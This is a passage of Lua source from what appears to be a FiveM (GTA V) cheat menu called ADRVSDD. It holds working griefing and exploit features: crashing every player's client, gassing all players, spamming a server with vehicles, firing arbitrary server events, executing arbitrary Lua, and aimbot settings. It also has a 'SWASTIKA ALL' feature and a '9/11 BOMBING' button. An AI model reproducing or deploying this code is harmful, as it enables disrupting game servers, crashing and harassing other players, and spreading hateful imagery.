                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       local _veh = ADRVSDD:GetFunction("IsPedInAnyVehicle") and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                       CreateThread(function()
                           ADRVSDD:RequestModelSync("stt_prop_stunt_track_dwslope30")
       
                           for vehicle in ADRVSDD:EnumerateVehicles() do
                               if vehicle ~= _veh or ADRVSDD.Config.OnlineIncludeSelf then
                                   local ramp = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")("stt_prop_stunt_track_dwslope30"), 0, 0, 0, true, true, true)
                                   ADRVSDD:DoNetwork(ramp)
                                   ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(vehicle)
                                   ADRVSDD:RequestControlOnce(vehicle)
                                   ADRVSDD:RequestControlOnce(ramp)
       
                                   if ADRVSDD:GetFunction("DoesEntityExist")(vehicle) then
                                       ADRVSDD:GetFunction("AttachEntityToEntity")(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                   end
                               end
       
                               Wait(50)
                           end
                       end)
       
                       ADRVSDD:AddNotification("INFO", "Turned all cars into ramps!", 10000)
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:Button("TURN ALL CARS INTO FIB BUILDING", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fib_all_cars") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       local _veh = ADRVSDD:GetFunction("IsPedInAnyVehicle") and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                       CreateThread(function()
                           for vehicle in ADRVSDD:EnumerateVehicles() do
                               if vehicle ~= _veh or ADRVSDD.Config.OnlineIncludeSelf then
                                   local building = ADRVSDD:GetFunction("CreateObject")(-1404869155, 0, 0, 0, true, true, true)
                                   ADRVSDD:DoNetwork(ramp)
                                   ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(vehicle)
                                   ADRVSDD:RequestControlOnce(vehicle)
                                   ADRVSDD:RequestControlOnce(building)
       
                                   if ADRVSDD:GetFunction("DoesEntityExist")(vehicle) then
                                       ADRVSDD:GetFunction("AttachEntityToEntity")(building, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                                   end
                               end
       
                               Wait(50)
                           end
                       end)
       
                       ADRVSDD:AddNotification("INFO", "Turned all cars into FIB Buildings!", 10000)
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:Button("DELETE VEHICLES", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_all_vehicles") then
                   ADRVSDD:AddNotification("INFO", "Deleting cars!", 10000)
                   ADRVSDD:DeleteVehicles()
               end
       
               curY = curY + 25
       
               if self.Painter:Button("VEHICLE SPAM SERVER", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_spam_server") then
                   ADRVSDD:CarSpamServer()
       
                   if not ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("INFO", "Unlimited vehicles!", 10000)
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:Button("SWASTIKA ALL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "swastika_all") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       CreateThread(function()
                           for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                               src = dict.tonumber(src)
       
                               if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
       
                                   if ADRVSDD:GetFunction("DoesEntityExist")(ped) then
                                       ADRVSDD.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](ADRVSDD:GetFunction("IsPedInAnyVehicle")(ped) and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ped) or ped)
                                       Wait(1000)
                                   end
                               end
                           end
                       end)
       
                       ADRVSDD:AddNotification("INFO", "Swastikas for all!", 10000)
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:Button("GAS ALL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "gas_all") then
                   if ADRVSDD.Config.SafeMode then
                       return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       CreateThread(function()
                           for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                               src = dict.tonumber(src)
       
                               if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
       
                                   if ADRVSDD:GetFunction("DoesEntityExist")(ped) then
                                       ADRVSDD:GasPlayer(src)
                                       Wait(1000)
                                   end
                               end
                           end
                       end)
       
                       ADRVSDD:AddNotification("INFO", "All players gassed!", 10000)
                   end
               end
       
               curY = curY + 25
               if self.DynamicTriggersasdf["CarryPeople"] and self.DynamicTriggersasdf["CarryPeople"]["CarryPeople:sync"] then
                   if self.Painter:Button("CARRY ALL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "carry_all") then
                       if ADRVSDD.Config.SafeMode then
                           return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                       else
                           TriggerServerEvent(self.DynamicTriggersasdf["CarryPeople"]["CarryPeople:sync"], -1, "misfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, -1, 100000, 0.0, 49, 33, 1)
                           ADRVSDD:AddNotification("INFO", "Carrying all players!", 10000)
                       end
                   end
       
                   curY = curY + 25
               end
       
               if self.Painter:Button("~r~CRASH ALL (SHIFT FOR METHOD)", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "crash_all") then
                   if ADRVSDD.Config.SafeMode then
                       return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       local method = nil
       
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                           local _method = ADRVSDD:GetTextInput("Enter crash method. [object / ped / both]", "both", 10)
       
                           if _method then
                               method = _method
                               ADRVSDD:AddNotification("INFO", "Using " .. method .. " crash method.")
                           end
                       end
       
                       CreateThread(function()
                           for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                               src = dict.tonumber(src)
       
                               if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
       
                                   if ADRVSDD:GetFunction("DoesEntityExist")(ped) then
                                       ADRVSDD:CrashPlayer(src, true, method)
                                       Wait(500)
                                   end
                               end
                           end
                       end)
       
                       ADRVSDD:AddNotification("INFO", "Crashing all players!", 10000)
                   end
               end
           end)
       
           local was_godmode
           local was_boosted
       
           function ADRVSDD:DoVehicleRelated()
               local curVeh = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
               if not ADRVSDD:GetFunction("DoesEntityExist")(curVeh) then return end
       
               if self.Config.Vehicle.BulletProofTires then
                   ADRVSDD:GetFunction("SetVehicleTyresCanBurst")(curVeh, false)
                   was_bulletproof = true
               elseif was_bulletproof then
                   ADRVSDD:GetFunction("SetVehicleTyresCanBurst")(curVeh, true)
                   was_bulletproof = false
               end
       
               if self.Config.Vehicle.GodMode then
                   ADRVSDD:GetFunction("SetEntityInvincible")(curVeh, true)
       
                   if ADRVSDD:GetFunction("IsVehicleDamaged")(curVeh) then
                       ADRVSDD:GetFunction("SetVehicleFixed")(curVeh)
                   end
       
                   was_godmode = true
               elseif was_godmode then
                   ADRVSDD:GetFunction("SetEntityInvincible")(curVeh, false)
                   was_godmode = false
               end
       
               if self.Config.Vehicle.Boost > 1.0 then
                   ADRVSDD:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, self.Config.Vehicle.Boost + 1.0)
                   was_boosted = true
               elseif was_boosted then
                   ADRVSDD:GetFunction("SetVehicleEnginePowerMultiplier")(curVeh, 1.0)
                   was_boosted = false
               end
           end
       
           ADRVSDD:AddCategory("Freecam", function(self, x, y)
               local curY = 5
       
               if self.Painter:CheckBox("FREECAM", self.FreeCam.On, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "freecam") then
                   self.FreeCam.On = not self.FreeCam.On
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 20
       
               if self.Painter:ListChoice("FREECAM MODE: ", self.FreeCam.ModeNames, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "freecam_mode") then
                   self.FreeCam.Mode = list_choices["freecam_mode"].selected
                   self.FreeCam.DraggingEntity = nil
                   lift_height = 0.0
                   lift_inc = 0.1
                   ADRVSDD.ConfigClass.Save(true)
               end
           end)
       
           ADRVSDD:AddCategory("World", function(self, x, y)
               local curY = 0
               if self.Painter:Button("9/11 BOMBING", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "9_11_bombing") then end -- Fuck you
           end)
       
           local keys = {"TAB", "MOUSE3", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
           local disable_keys = {"-", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
           local freecam_keys = {"HOME", "MOUSE3", "TAB", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
           local rccar_keys = {"=", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
           local aimbot_keys = {"MOUSE1", "MOUSE2", "MOUSE3", "LEFTALT", "LEFTSHIFT", "MOUSE2", "SPACE", "C", "X", "Z", "V", "F", "G", "H", "E", "R", "Q", "T", "Y", "U", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}
       
           local function _run_lua(resource, trigger)
               local args = ADRVSDD:GetTextInput("Enter Arguments.", "", 100)
               local _args
       
               if not args or args == "" then
                   _args = {}
               else
                   local e, r = load("return {" .. args .. "}")
       
                   if e then
                       _args = e()
                   else
                       ADRVSDD:AddNotification("ERROR", "Execution failed. See console for details.")
                       ADRVSDD:Print("[LUA] Execution Failed (Arguments): ^1" .. r .. "^7")
                   end
               end
       
               if dict.type(_args) == "table" then
                   local amount = ADRVSDD:GetTextInput("Enter repetitions.", 1, 10)
       
                   if not amount or dict.tonumber(amount) then
                       amount = 1
                   end
       
                   amount = dict.tonumber(amount)
                   local _type = ADRVSDD:GetTextInput("Enter method. [CL/SV]", "SV", 2)
       
                   if _type == "CL" then
                       for i = 1, amount do
                           ADRVSDD:GetFunction("TriggerEvent")(((not resource) and trigger or (ADRVSDD.DynamicTriggersasdf[resource][trigger])), _args)
                       end
       
                       ADRVSDD:AddNotification("INFO", "[CL] Running " .. ((not resource) and trigger or (ADRVSDD.DynamicTriggersasdf[resource][trigger])) .. " " .. amount .. " time(s)")
                   elseif _type == "SV" then
                       for i = 1, amount do
                           ADRVSDD:GetFunction("TriggerServerEvent")(((not resource) and trigger or (ADRVSDD.DynamicTriggersasdf[resource][trigger])), _args)
                       end
       
                       ADRVSDD:AddNotification("INFO", "[SV] Running " .. ((not resource) and trigger or (ADRVSDD.DynamicTriggersasdf[resource][trigger])) .. " " .. amount .. " time(s)")
                   else
                       ADRVSDD:AddNotification("ERROR", "Bad type.")
                   end
               end
           end
       
           ADRVSDD:AddCategory("Lua", function(self, x, y)
               local curY = 0
       
               for resource, events in dict.pairs(self.DynamicTriggersasdf) do
                   for trigger, real in dict.pairs(events) do
                       local _trigger = self.Painter:Button(trigger, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "dynamic_trigger_" .. trigger)
       
                       if _trigger then
                           _run_lua(resource, trigger)
                       end
       
                       curY = curY + 25
                   end
               end
       
               if self.Painter:CheckBox("SHOW KEYS PRESSED", self.Config.ShowControlsOnScreen, x, y, 5, self.MenuH - 105, 200, 20, 255, 255, 255, 255, "onscreen_controls", false, 0.38) then
                   ADRVSDD.Config.ShowControlsOnScreen = not ADRVSDD.Config.ShowControlsOnScreen
               end
       
               local custom = self.Painter:Button("EXECUTE TRIGGER", x, y, 5, self.MenuH - 80, 200, 20, 255, 255, 255, 255, "execute_custom")
       
               if custom then
                   local event = self:GetTextInput("Enter trigger.", "", 100)
       
                   if event and event ~= "" then
                       _run_lua(nil, event)
                   end
               end
       
               local custom_lua = self.Painter:Button("EXECUTE LUA", x, y, 545, self.MenuH - 80, 200, 20, 255, 255, 255, 255, "execute_custom_lua")
       
               if custom_lua then
                   local code = self:GetTextInput("Enter lua code.", "", 2000)
       
                   if code then
                       local e, r = load(code)
       
                       if e then
                           e()
                       else
                           ADRVSDD:AddNotification("ERROR", "Execution failed. See console for details.")
                           ADRVSDD:Print("[LUA] Execution Failed: ^1" .. r .. "^7")
                       end
                   end
               end
           end)
       
           local selected_config = "none"
       
           ADRVSDD:AddCategory("Misc", function(self, x, y, w, h)
               local curY = 5
               local _width = self.Painter:GetTextWidth("Your build does not support to use of configs.", 4, 0.4)
               if _Executor ~= "redENGINE" then return self.Painter:DrawText("Your build does not support to use of configs.", 4, true, x + _width, self.Config.MenuY + 100, 0.4, 255, 255, 255, 255) end
               _width = self.Painter:GetTextWidth("CURRENT CONFIG: ~y~" .. current_config:upper(), 4, 0.4)
               self.Painter:DrawText("CURRENT CONFIG: ~y~" .. current_config:upper(), 4, false, (x + w / 2) - (_width / 2), y + curY, 0.4, 255, 255, 255, 255)
               curY = curY + 25
               _width = self.Painter:GetTextWidth("SELECTED: ~y~" .. selected_config:upper(), 4, 0.4)
               self.Painter:DrawText("SELECTED: ~y~" .. selected_config:upper(), 4, false, (x + w / 2) - (_width / 2), y + curY, 0.4, 255, 255, 255, 255)
               curY = curY + 25
               local cl_w = self.Painter:GetTextWidth("NEW CONFIG", 4, 0.4)
       
               if self.Painter:Button("NEW CONFIG", x, y, 545, self.MenuH - 80, cl_w, 20, 255, 255, 255, 255, "new_config") then
                   selected_config = "none"
                   local name = ADRVSDD:GetTextInput("Enter the name of the new config.", "", 50)
       
                   if name then
                       if not name:find("ADRVSDD_") then
                           name = "ADRVSDD_" .. name
                       end
       
                       ADRVSDD.List[name] = _count(ADRVSDD.List) + 1
                       ADRVSDD:SetConfigList()
                       ADRVSDD.ConfigClass.Write(name, ADRVSDD.DefaultConfig)
                       ADRVSDD:AddNotification("SUCCESS", "Config created.", 10000)
                   end
               end
       
               for name, cfg in dict.pairs(ADRVSDD.List) do
                   if self.Painter:Button("CONFIG: ~y~" .. name:upper(), x, y, 5, curY, 200, 20, 255, 255, 255, 255, "config_" .. name) then
                       selected_config = name
                   end
       
                   if selected_config == name then
                       local curX = 5
                       local l_w = self.Painter:GetTextWidth("LOAD", 4, 0.4)
       
                       if self.Painter:Button("LOAD", x, y, curX, self.MenuH - 80, l_w, 20, 255, 255, 255, 255, "load_config") then
                           selected_config = "none"
                           current_config = name
                           ADRVSDD.ConfigClass.Load()
                       end
       
                       curX = curX + l_w + 5
                       local r_w = self.Painter:GetTextWidth("RESET", 4, 0.4)
       
                       if self.Painter:Button("RESET", x, y, curX, self.MenuH - 80, r_w, 20, 255, 255, 255, 255, "reset_config") then
                           selected_config = "none"
                           ADRVSDD.ConfigClass:Write(name, ADRVSDD.DefaultConfig)
                           ADRVSDD:AddNotification("SUCCESS", "Config reset.", 10000)
                       end
       
                       curX = curX + r_w + 5
                       local c_w = self.Painter:GetTextWidth("CLONE", 4, 0.4)
       
                       if self.Painter:Button("CLONE", x, y, curX, self.MenuH - 80, c_w, 20, 255, 255, 255, 255, "clone_config") then
                           selected_config = "none"
                           local name = ADRVSDD:GetTextInput("Enter the name of the config.", "", 50)
       
                           if name then
                               if not name:find("ADRVSDD_") then
                                   name = "ADRVSDD_" .. name
                               end
       
                               ADRVSDD.List[name] = _count(ADRVSDD.List) + 1
                               ADRVSDD:SetConfigList()
                               ADRVSDD.ConfigClass.Write(name, ADRVSDD.Config)
                               ADRVSDD:AddNotification("SUCCESS", "Config cloned.", 10000)
                           end
                       end
       
                       curX = curX + c_w + 5
                       local rn_w = self.Painter:GetTextWidth("RENAME", 4, 0.4)
       
                       if self.Painter:Button("RENAME", x, y, curX, self.MenuH - 80, rn_w, 20, 255, 255, 255, 255, "rename_config") then
                           local old_name = name
                           local new_name = ADRVSDD:GetTextInput("Enter the name of the config.", "", 50)
       
                           if new_name then
                               if not new_name:find("ADRVSDD_") then
                                   new_name = "ADRVSDD_" .. new_name
                               end
       
                               selected_config = new_name
                               ADRVSDD.List[new_name] = ADRVSDD.List[old_name] or (_count(ADRVSDD.List) + 1)
                               ADRVSDD.List[old_name] = nil
                               ADRVSDD:SetConfigList()
                               ADRVSDD.ConfigClass.Rename(old_name, new_name)
                               ADRVSDD:AddNotification("SUCCESS", "Config renamed.", 10000)
                           end
                       end
       
                       curX = curX + rn_w + 5
                       local d_w = self.Painter:GetTextWidth("DELETE", 4, 0.4)
       
                       if self.Painter:Button("DELETE", x, y, curX, self.MenuH - 80, d_w, 20, 255, 255, 255, 255, "delete_config") then
                           selected_config = "none"
                           current_config = "ADRVSDD_default"
                           ADRVSDD.List[name] = nil
                           ADRVSDD.ConfigClass.Delete(name)
                           ADRVSDD:SetConfigList()
                           ADRVSDD.ConfigClass.Load()
                           ADRVSDD:AddNotification("SUCCESS", "Config deleted.", 10000)
                       end
                   end
       
                   curY = curY + 25
               end
           end)
       
           function ADRVSDD:IndexOf(table, val)
               for k, v in dict.pairs(table) do
                   if v == val or k == val then return (v == val and k) or v end
               end
       
               return -1
           end
       
           ADRVSDD:AddCategory("Settings", function(self, x, y)
               local curY = 5
       
               if self.Painter:CheckBox("SHOW SCREEN ELEMENTS", self.Config.ShowText, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "text_settings_enabled", false) then
                   self.Config.ShowText = not self.Config.ShowText
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("MENU SOUNDS", self.Config.UseSounds, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "menu_sounds", false) then
                   self.Config.UseSounds = not self.Config.UseSounds
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("AUTO MOVE WITH MENU OPEN", self.Config.UseAutoWalk, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "auto_walk_enabled", false) then
                   self.Config.UseAutoWalk = not self.Config.UseAutoWalk
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("AUTO MOVE WITH FREECAM / RC CAR", self.Config.UseAutoWalkAlt, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "auto_walk_alt_enabled", false) then
                   self.Config.UseAutoWalkAlt = not self.Config.UseAutoWalkAlt
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("SAFE MODE", self.Config.SafeMode, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "safe_mode", false) then
                   self.Config.SafeMode = not self.Config.SafeMode
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("DRAW BACKGROUND IMAGE", self.Config.UseBackgroundImage, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "use_bg_image", false) then
                   self.Config.UseBackgroundImage = not self.Config.UseBackgroundImage
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("USE PRINT MESSAGES", self.Config.UsePrintMessages, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "use_print_images", false) then
                   self.Config.UsePrintMessages = not self.Config.UsePrintMessages
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 20
       
               if self.Painter:ListChoice("TOGGLE KEY: ", keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "toggle_key", ADRVSDD:IndexOf(keys, self.Config.ShowKey)) then
                   self.Config.ShowKey = keys[list_choices["toggle_key"].selected]
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:ListChoice("DISABLE KEY: ", disable_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "disable_key", ADRVSDD:IndexOf(disable_keys, self.Config.DisableKey), "DisableKey") then
                   self.Config.DisableKey = disable_keys[list_choices["disable_key"].selected]
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:ListChoice("FREECAM KEY: ", freecam_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "freecam_key", ADRVSDD:IndexOf(freecam_keys, self.Config.FreeCamKey), "FreeCamKey") then
                   self.Config.FreeCamKey = freecam_keys[list_choices["freecam_key"].selected]
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:ListChoice("RC CAR CAM KEY: ", rccar_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "rccar_key", ADRVSDD:IndexOf(rccar_keys, self.Config.RCCamKey), "RCCamKey") then
                   self.Config.RCCamKey = rccar_keys[list_choices["rccar_key"].selected]
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:ListChoice("AIMBOT KEY: ", aimbot_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_key", ADRVSDD:IndexOf(aimbot_keys, self.Config.Player.AimbotKey)) then
                   self.Config.Player.AimbotKey = aimbot_keys[list_choices["aimbot_key"].selected]
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:ListChoice("AIMBOT RELEASE KEY: ", aimbot_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_release_key", ADRVSDD:IndexOf(aimbot_keys, self.Config.Player.AimbotReleaseKey), "AimbotReleaseKey") then
                   self.Config.Player.AimbotReleaseKey = aimbot_keys[list_choices["aimbot_release_key"].selected]
                   ADRVSDD.ConfigClass.Save(true)
               end
           end)
       
           ADRVSDD:AddCategory("~r~KILL", function(self, x, y)
               ADRVSDD.Showing = false
               ADRVSDD.FreeCam.On = false
               ADRVSDD.RCCar.On = false
       
               ADRVSDD.Config = {
                   Player = {},
                   Vehicle = {}
               }
       
               ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), false)
               ADRVSDD.Enabled = false
               ADRVSDD:GetFunction("DestroyCam")(ADRVSDD.FreeCam.Cam)
               ADRVSDD:GetFunction("DestroyCam")(ADRVSDD.RCCar.Cam)
               ADRVSDD:GetFunction("DestroyCam")(ADRVSDD.SpectateCam)
               ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
               ADRVSDD:DoBlips(true)
           end)
       
           local scroller_pos
           local scroller_size
           local old_scroller
           local cur_count
           local scroller_max
       
           function ADRVSDD:GetScrollBasis(count)
               if count <= 30 then
                   return 1.0
               elseif count <= 40 then
                   return 1.1
               elseif count <= 50 then
                   return 1.66
               elseif count <= 60 then
                   return 2.22
               elseif count <= 70 then
                   return 2.77
               elseif count <= 80 then
                   return 3.33
               elseif count <= 90 then
                   return 3.88
               elseif count <= 100 then
                   return 4.45
               elseif count <= 110 then
                   return 5.0
               else
                   return count / 13.18
               end
           end
       
           local halt
       
           local title_color = {
               r = 255,
               g = 255,
               b = 255
           }
       
           local mode = 1
       
           local function _do_title_color()
               if mode == 1 then
                   local r, g, b = _lerp(0.025, title_color.r, ADRVSDD.Tertiary[1]), _lerp(0.025, title_color.g, ADRVSDD.Tertiary[2]), _lerp(0.025, title_color.b, ADRVSDD.Tertiary[3])
       
                   if dict.math.abs(ADRVSDD.Tertiary[1] - r) <= 3 and dict.math.abs(ADRVSDD.Tertiary[2] - g) <= 3 and dict.math.abs(ADRVSDD.Tertiary[3] - b) <= 3 then
                       mode = 2
                   end
       
                   title_color.r = r
                   title_color.g = g
                   title_color.b = b
               elseif mode == 2 then
                   local r, g, b = _lerp(0.025, title_color.r, 255), _lerp(0.025, title_color.g, 255), _lerp(0.025, title_color.b, 255)
       
                   if dict.math.abs(255 - r) <= 3 and dict.math.abs(255 - g) <= 3 and dict.math.abs(255 - b) <= 3 then
                       mode = 1
                   end
       
                   title_color.r = r
                   title_color.g = g
                   title_color.b = b
               end
           end
       
           function ADRVSDD:DrawMenu()
               _do_title_color()
       
               if self.Painter:Holding(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar") then
                   ADRVSDD:GetFunction("SetMouseCursorSprite")(4)
                   local x, y = self:TranslateMouse(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar")
                   self.Config.MenuX = x
                   self.Config.MenuY = y
               elseif was_dragging == "drag_bar" then
                   self.DraggingX = nil
                   self.DraggingY = nil
                   was_dragging = nil
                   ADRVSDD.ConfigClass.Save(true)
               end
       
       
               if self.Config.NotifX and self.Config.NotifY and self.Config.NotifW then
                   if self.Painter:Holding(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif") then
                       ADRVSDD:GetFunction("SetMouseCursorSprite")(4)
                       local x, y = self:TranslateMouse(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif")
                       self.Config.NotifX = x
                       self.Config.NotifY = y
                   elseif was_dragging == "drag_notif" then
                       self.DraggingX = nil
                       self.DraggingY = nil
                       was_dragging = nil
                       ADRVSDD.ConfigClass.Save(true)
                   end
               end
       
               self:LimitRenderBounds()
       
               if self.Config.UseBackgroundImage then
                   self.Painter:DrawSprite(self.Config.MenuX + (self.MenuW / 2), self.Config.MenuY + (self.MenuH / 2), self.MenuW, self.MenuH, 0.0, "ADRVSDD", "menu_bg", 255, 255, 255, 255, true)
               end
       
               self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY - 38, 90, 33, 10, 10, 10, 200)
               self.Painter:DrawText(self.Name, 4, false, self.Config.MenuX + 2, self.Config.MenuY - 37, 0.4, dict.math.ceil(title_color.r), dict.math.ceil(title_color.g), dict.math.ceil(title_color.b), 255)
               self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, self.MenuH, 0, 0, 0, 200)
               self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, 18, 30, 30, 30, 200)
               self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY + 16, self.MenuW, 2, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], self.Tertiary[4])
               self.Painter:DrawRect(self.Config.MenuX + 5, self.Config.MenuY + 23, 515 + 113, self.MenuH - 28, 10, 10, 10, 200)
               self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 103, 280, self.MenuH - 108, 10, 10, 10, 200)
               self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 65, 280, 35, 10, 10, 10, 200)
               self.Painter:DrawRect(self.Config.MenuX + 520 + 113, self.Config.MenuY + 23, 283, 39, 10, 10, 10, 200)
               local list_pos = {}
       
               if not self.Util:ValidPlayer(self.SelectedPlayer) then
                   self.Painter:DrawText("Online Players: " .. #ADRVSDD.PlayerCache, 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 68, 0.35, 255, 255, 255, 255)
       
                   if not scroller_pos then
                       scroller_pos = 0
                   end
       
                   local plyY = self.Config.MenuY + 101 - scroller_pos * self:GetScrollBasis(#ADRVSDD.PlayerCache)
                   scroller_max = self.MenuH - 120
                   scroller_size = old_scroller or scroller_max
       
                   if cur_count ~= #ADRVSDD.PlayerCache then
                       scroller_size = scroller_max
                       old_scroller = nil
                   end
       
                   local _players = ADRVSDD.PlayerCache
                   table.sort(_players, sort_func)
       
                   for id, src in dict.pairs(_players) do
                       table.insert(list_pos, {
                           id = id,
                           src = src,
                           pos = dict.math.abs(self.Config.MenuY + 101 - plyY)
                       })
       
                       local color = {255, 255, 255}
       
                       if friends[ADRVSDD:GetFunction("GetPlayerServerId")(src)] then
                           color = {55, 200, 55}
                       end
       
                       if plyY >= (self.Config.MenuY + 92) and plyY <= (self.Config.MenuY + self.MenuH - 30) then
                           if self.Painter:Button("ID: " .. ADRVSDD:GetFunction("GetPlayerServerId")(src) .. " | Name: " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(src)), self.Config.MenuX + 525 + 113, plyY, 5, 5, nil, 20, color[1], color[2], color[3], 255, "player_" .. id, false, 0.35) then
                               self.SelectedPlayer = src
                           end
                       else
                           if not old_scroller then
                               scroller_size = self:Clamp(scroller_size - 23, 50, scroller_max)
                           end
                       end
       
                       plyY = plyY + 23
                   end
       
                   halt = false
       
                   if not old_scroller then
                       old_scroller = scroller_size
                   end
       
                   if not cur_count then
                       cur_count = #ADRVSDD.PlayerCache
                   end
       
                   self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108, 8, self.MenuH - 120, 20, 20, 20, 255)
                   self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], self.Tertiary[4])
       
                   if self.Painter:Hovered(self.Config.MenuX + 5 + 100 + 5 + 415 + 113, self.Config.MenuY + 103, 280, self.MenuH - 108) then
